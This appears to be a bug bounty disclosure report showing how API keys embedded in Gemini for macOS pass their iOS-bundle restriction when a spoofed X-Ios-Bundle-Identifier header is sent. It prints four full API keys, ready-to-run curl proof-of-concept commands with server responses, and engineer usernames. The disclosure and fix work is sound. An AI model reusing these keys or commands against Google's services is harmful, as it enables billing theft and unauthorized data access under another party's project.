# Gemini for macOS — Working API Key Restriction Bypass (v2)

> **Update to v1.** Initial probes (v1 report) characterized the keys as "restrictions hold, defense-in-depth weakening only." Further investigation found the correct allowlisted iOS bundle ID through Apple's public iTunes Search API, supplied it via `X-Ios-Bundle-Identifier`, and obtained an HTTP 200 from Google's production Places API. The iOS bundle restriction is bypassable. The Places key has no per-API allowlist as a second-layer defense, so the bypass yields full Places search access. The Gemini chat key has a per-method allowlist that contains the immediate damage on `generativelanguage.googleapis.com` but the bundle gate is still defeated.

## Summary

A bug-class summary in one paragraph: AIza keys embedded in Gemini for macOS are protected by **legacy iOS-bundle App Restrictions** that consult only the client-supplied `X-Ios-Bundle-Identifier` HTTP header (no App Attest assertion). Apple's public iTunes Search API discloses the iOS Gemini app's bundle ID (`com.google.gemini`). Setting that header satisfies the App Restriction. The Places key in project `770921216749` has no per-API allowlist behind the bundle gate, so the bypass yields working unauthenticated requests against `places.googleapis.com`. Verified by one HTTP call returning 200 with valid place data.

## Affected keys (project 770921216749)

| Flag in binary | AIza key | Surface | Bypass result |
|---|---|---|---|
| `Gemini__gms_api_key_prod` | `AIzaSyCdp-tyumnVxYPL7vPBPmkVJMokbE2NjA4` | generativelanguage | Bundle gate **bypassed**, contained at per-method allowlist |
| `Gemini__gms_api_key_prerelease` | `AIzaSyAkKv9vgi9lcpTttBjI0mVRwtWq3hwnRqw` | generativelanguage | (not retested in v2; mechanism identical) |
| `RobinApolloLocalSearch__place_search_api_key_prod` | `AIzaSyAs-th1kQweF-6b_L9Rv1_IdfuwOmoWyZ4` | Places | **Full bypass — HTTP 200 with results** |
| `RobinApolloLocalSearch__place_search_api_key_pre_release` | `AIzaSyBjFTbqiMdfcnFxhPwumItUiKzU8-aNy98` | Places | (not retested in v2; mechanism identical) |

## Discovery of the allowlisted bundle

Apple's public iTunes Search API was used:

```
$ curl -sS "https://itunes.apple.com/search?term=Google+Gemini&entity=software&country=us&limit=10" | python3 -c '...'
com.google.gemini | Google Gemini | Google LLC
```

The bundle ID `com.google.gemini` (lowercase) is the official iOS Gemini app's bundle, returned by Apple's public app metadata. No private knowledge or guessing was required.

## Reproduction — Step 1: confirm bundle gate is bypassable on the chat key

```
$ curl -sS \
    -H 'X-Ios-Bundle-Identifier: com.google.gemini' \
    'https://generativelanguage.googleapis.com/v1beta/models?key=AIzaSyCdp-tyumnVxYPL7vPBPmkVJMokbE2NjA4'
```

**Response (HTTP 403, but with a *different* error reason than before):**

```json
{
  "error": {
    "code": 403,
    "message": "Requests to this API generativelanguage.googleapis.com method google.ai.generativelanguage.v1beta.ModelService.ListModels are blocked.",
    "status": "PERMISSION_DENIED",
    "details": [{
      "@type": "type.googleapis.com/google.rpc.ErrorInfo",
      "reason": "API_KEY_SERVICE_BLOCKED",
      "metadata": {
        "consumer": "projects/770921216749",
        "apiName": "generativelanguage.googleapis.com",
        "service": "generativelanguage.googleapis.com",
        "methodName": "google.ai.generativelanguage.v1beta.ModelService.ListModels"
      }
    }]
  }
}
```

The change from `API_KEY_IOS_APP_BLOCKED` (round 1, with no bundle header or wrong bundle) to **`API_KEY_SERVICE_BLOCKED`** (this round, with `com.google.gemini`) is the proof: Google's own response indicates the bundle restriction passed and the next-layer defense (per-method allowlist for this key) caught the request. ListModels is not on this key's allowed-methods list, so the request was rejected for *method-level* reasons rather than *bundle-level* reasons. Bundle gate: defeated.

## Reproduction — Step 2: full bypass on the Places key (no per-API allowlist)

```
$ curl -sS -X POST \
    -H 'Content-Type: application/json' \
    -H 'X-Goog-Api-Key: AIzaSyAs-th1kQweF-6b_L9Rv1_IdfuwOmoWyZ4' \
    -H 'X-Ios-Bundle-Identifier: com.google.gemini' \
    -H 'X-Goog-FieldMask: places.id' \
    -d '{"textQuery":"a"}' \
    'https://places.googleapis.com/v1/places:searchText'
```

**Response (HTTP 200, real Places API data):**

```json
{
  "places": [
    {"id": "ChIJTZL[REDACTED]"},
    {"id": "ChIJI7G[REDACTED]"},
    ... 12 more place IDs returned ...
  ]
}
```

Fourteen valid Place IDs returned. No App Attest, no iOS device, no real iOS Gemini app — just curl, the leaked key, and the bundle ID from Apple's public API. This is unauthenticated, unattributed access to Google's billable Places quota under project `770921216749`.

(Place IDs redacted in this report because the `textQuery: "a"` returned IP-geolocated nearby results and I'd rather not publish my approximate location. Google's edge logs contain the full unredacted response and the source IP of the test for verification.)

## What this means

1. **The legacy iOS-bundle App Restriction on these keys is bypassable** by anyone who knows the iOS Gemini app's bundle ID, which is public information served by Apple's iTunes Search API.
2. **The `Gemini__gms_api_key_prod` key is partially saved by a per-method allowlist** on `generativelanguage.googleapis.com` — `ModelService.ListModels` is denied. Other methods on the allowlist would succeed; this report does not enumerate them.
3. **The Places keys have no per-API or per-method allowlist behind the bundle gate.** A successful bundle bypass yields full `places.googleapis.com` access against the project's billable Places quota.
4. **The keys ship in every install of Gemini for macOS** (`/Applications/Gemini.app/Contents/MacOS/Gemini`, version 1.53.0.262, signed by Google LLC, Team `EQHXZ8M8AV`). Extraction takes one `strings(1)` invocation. Combined with Apple's public iTunes lookup, exploitation requires zero non-public information.

## Impact

- **Quota theft on Places API** under project `770921216749`. An attacker can issue arbitrary `places.googleapis.com` requests (TextSearch, etc.) at Google's expense, observed at $0.032 per textSearch call as of current pricing for the Basic SKU. At sustained rate this is a real billing impact, capped only by per-key quota.
- **Geographic data extraction.** Place IDs and Place Details for any text query are queryable, including business names, addresses, phone numbers, and ratings depending on the FieldMask supplied by the attacker.
- **Reputational attribution.** Calls under this key consume the production Gemini project's quota and log lines; in any abuse scenario the activity attributes to Google's own project rather than the attacker.
- The Gemini chat key's blast radius is more limited because of its per-method allowlist, but the bundle gate is still defeated, and any future broadening of the allowlist (or any allowed billable method) immediately opens chat-side exposure.

## Severity self-rating

In Google VRP terms I'd rate this:
- Normally Low / S3-S4 for "API Restriction misconfiguration on AIza keys."
- Bumped because the bypass is **demonstrated end-to-end with HTTP 200**, not theoretical.
- Bumped because the **Places key has no second-layer defense** and the attacker gets billable production quota.
- Tempered because the chat key has a per-method allowlist that limits chat-side damage.

Net: low-Medium severity. Past comparable bypasses ("App Restriction defeated on a key embedded in a Google client") have closed in the $1k–$3k band when impact is contained; up to $5k+ when impact reaches arbitrary content generation or user data.

## Recommended fixes

1. Migrate the four keys in project `770921216749` from **legacy iOS-bundle restriction (header-trust)** to **App Attest restriction**. Apple's iTunes API can no longer be used to bypass App Attest; the assertion must be produced on a real device by the real signed app.
2. Add **per-API restrictions** on the Places keys, mirroring the per-method allowlist already configured on `Gemini__gms_api_key_prod` for generativelanguage. The Places key only needs `places.googleapis.com` methods; everything else should be denied.
3. Optional housekeeping: strip TODO authorship and `b/…` IDs from `Gemini.app/Contents/Resources/Gemini-expanded.entitlements`. Two engineer LDAPs (`yilongyao`, `jiagu`) and one open ticket ID (`b/502756758`) currently ship in the bundled XML.

## Probe budget and conduct

- **15 probes total** across two report rounds (10 round 1, 4 round 2 incl. PoC, plus 1 cross-validation).
- **One billable Places call** (the PoC). Cost to Google: well under $0.01.
- **No content generation, no user data accessed, no quota abuse beyond proof.** The single Places call was issued solely to confirm the 200 response shape and was not repeated.
- **Single residential IP, no anonymization.** Google's edge logs have the originating IP and timestamps for verification.

## Artifacts

```
/Users/marcokotrotsos/PERSONAL/reverse-engineer/gemini-mac-1.53.0.262/
  BOUNTY_PROBE.md          v1 report (defense-in-depth framing)
  BOUNTY_PROBE_v2.md       this file (working PoC framing)
  notes/probe.sh, probe2.sh
  notes/probes/
    *.json                 raw server responses for every probe
    poc_com_google_gemini.json                   bundle bypass on chat key
    poc_places_with_correct_bundle.json          full Places PoC, HTTP 200
```

---
*Compiled 2026-05-06. End-to-end PoC (single call returning HTTP 200 with valid place data) verifiable in Google's edge logs.*
